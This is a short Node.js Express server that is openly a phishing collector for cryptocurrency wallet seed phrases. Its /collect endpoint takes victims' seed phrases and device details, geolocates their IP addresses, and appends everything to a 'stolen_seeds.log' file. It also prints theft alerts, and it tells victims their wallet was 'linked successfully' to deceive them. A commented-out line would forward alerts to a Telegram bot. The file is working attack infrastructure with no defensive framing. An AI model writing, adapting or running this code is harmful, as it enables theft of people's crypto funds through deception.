const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const geoip = require('geoip-lite'); // npm install geoip-lite

const app = express();
app.use(bodyParser.json({ limit: '10mb' }));

app.post('/collect', (req, res) => {
    const data = req.body;
    const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';
    const geo = geoip.lookup(ip) || {};
    
    const logEntry = {
        timestamp: data.timestamp || new Date().toISOString(),
        seed: data.seed,
        ip: ip,
        geo: `${geo.country || '??'} ${geo.city || ''}`,
        userAgent: data.userAgent,
        platform: data.platform,
        screen: data.screen,
        timezone: data.timezone,
        hardware: data.hardwareConcurrency,
        fullData: data
    };
    
    const logLine = JSON.stringify(logEntry, null, 2) + '\n---\n';
    
    fs.appendFileSync('stolen_seeds.log', logLine);
    console.log(`💰 NEW HIGH-QUALITY SEED PHRASE STOLEN from ${ip} (${geo.country})`);
    
    // Optional: Send to Telegram bot for instant alert
    // fetch('https://api.telegram.org/botYOUR_TOKEN/sendMessage?chat_id=CHAT_ID&text=New%20seed!')
    
    res.status(200).json({ status: "connected", message: "Wallet linked successfully" });
});

app.get('/status', (req, res) => res.send('Phishing collector online'));
app.listen(3000, () => console.log("🚀 Enhanced phishing collector running on port 3000"));
